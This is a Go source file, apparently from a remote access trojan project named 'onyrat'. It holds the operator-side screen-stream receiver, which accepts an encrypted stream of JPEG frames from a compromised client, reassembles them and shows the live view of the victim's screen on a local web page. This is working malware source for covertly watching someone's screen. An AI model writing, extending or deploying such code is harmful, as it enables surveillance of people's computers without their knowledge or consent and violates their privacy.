//go:build server
// +build server

package videostreaming

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/Onyz107/onyrat/internal/infobar"
	"github.com/Onyz107/onyrat/pkg/network"
)

var (
	latestImage []byte
	imgMutex    sync.RWMutex
)

func ScreenstreamReceive(s *network.KCPServer, c *network.KCPClient, ctx context.Context) error {
	inCtx, cancel := context.WithCancelCause(ctx)
	defer cancel(nil)

	stream, err := c.Manager.AcceptStream(screenStream, 20*time.Second)
	if err != nil {
		return fmt.Errorf("failed to accept screen stream: %w", err)
	}
	defer stream.Close()

	r, err := s.NewStreamedEncryptedReceiver(stream, 5*time.Second)
	if err != nil {
		return fmt.Errorf("failed to create encrypted receiver: %w", err)
	}
	defer r.Close()

	setupHTMLServer(inCtx, cancel)

	for {
		select {

		case <-inCtx.Done():
			if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
				return fmt.Errorf("failed to receive screen stream: %w", err)
			}
			return nil

		default:
			buf, err := readJPEGFromReader(r)
			if err != nil {
				cancel(fmt.Errorf("failed to read jpeg from stream: %w", err))
				continue
			}

			imgMutex.Lock()
			latestImage = buf
			imgMutex.Unlock()
		}
	}
}

func readJPEGFromReader(r io.Reader) ([]byte, error) {
	buf := bufPool.Get().([]byte)
	defer bufPool.Put(buf)

	result := lazyBufPool.Get().([]byte)
	defer lazyBufPool.Put(result[:0])

	var state int // 0=looking for SOI, 1=found SOI, 2=complete
	var lastByte byte
	var hasLastByte bool

	for state < 2 {
		n, err := r.Read(buf)
		if n == 0 {
			if err == io.EOF {
				break
			}
			if err != nil {
				return nil, err
			}
			continue
		}

		data := buf[:n]
		start := 0

		// Handle cross-chunk boundary
		if hasLastByte {
			if state == 0 && lastByte == 0xFF && data[0] == 0xD8 {
				// Found SOI across boundary
				state = 1
				result = append(result, 0xFF, 0xD8)
				start = 1
			} else if state == 1 && lastByte == 0xFF && data[0] == 0xD9 {
				// Found EOI across boundary
				result = append(result, 0xFF, 0xD9)
				return result, nil
			} else if state == 1 {
				result = append(result, lastByte)
			}
			hasLastByte = false
		}

		// Process the chunk
		for i := start; i < len(data)-1; i++ {
			if data[i] == 0xFF {
				if state == 0 && data[i+1] == 0xD8 {
					// Found SOI
					state = 1
					result = append(result, data[i:i+2]...)
					i++ // Skip next byte as it's part of marker
				} else if state == 1 && data[i+1] == 0xD9 {
					// Found EOI
					result = append(result, data[i:i+2]...)
					return result, nil
				} else if state == 1 {
					result = append(result, data[i])
				}
			} else if state == 1 {
				result = append(result, data[i])
			}
		}

		// Handle last byte of chunk (might be part of marker)
		if len(data) > start {
			lastByte = data[len(data)-1]
			hasLastByte = true
		}

		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, err
		}
	}

	// Add final byte if we're in the middle of JPEG data
	if hasLastByte && state == 1 {
		result = append(result, lastByte)
	}

	if state == 0 {
		return nil, fmt.Errorf("SOI marker not found")
	}

	return result, nil
}

func setupHTMLServer(ctx context.Context, cancel context.CancelCauseFunc) {
	ln, err := net.Listen("tcp", "127.0.0.1:0") // pick any free port
	if err != nil {
		cancel(fmt.Errorf("failed to start local TCP server: %w", err))
		return
	}
	listenAddr := ln.Addr().String()

	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprintf(w, "%s", html)
	})

	mux.HandleFunc("/image", func(w http.ResponseWriter, r *http.Request) {
		imgMutex.RLock()
		defer imgMutex.RUnlock()
		if latestImage == nil {
			http.Error(w, "No image yet", http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "image/jpeg")
		w.Write(latestImage)
	})

	srv := &http.Server{Handler: mux}

	update := infobar.InfoStatus(fmt.Sprintf("Opened local HTTP server at http://%s/", listenAddr))

	go func() {
		ticker := time.NewTicker(time.Second)
		for {
			select {

			case <-ticker.C:
				update(fmt.Sprintf("Serving screen stream at http://%s/ Type \"help\" for information on how to stop", listenAddr))

			case <-ctx.Done():
				ticker.Stop()
				return

			}
		}
	}()

	go func() {
		if err := srv.Serve(ln); err != nil && err != http.ErrServerClosed {
			cancel(fmt.Errorf("failed to serve local HTTP server: %w", err))
		}
	}()

	go func() {
		<-ctx.Done()

		shutdownCtx, shutdownCancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer shutdownCancel()

		if err := srv.Shutdown(shutdownCtx); err != nil {
			cancel(fmt.Errorf("failed to shutdown local HTTP server: %w", err))
			return
		}

		update(fmt.Sprintf("HTTP server on %s has been shut down.", listenAddr))
		time.Sleep(5 * time.Second)
		update("")
	}()
}
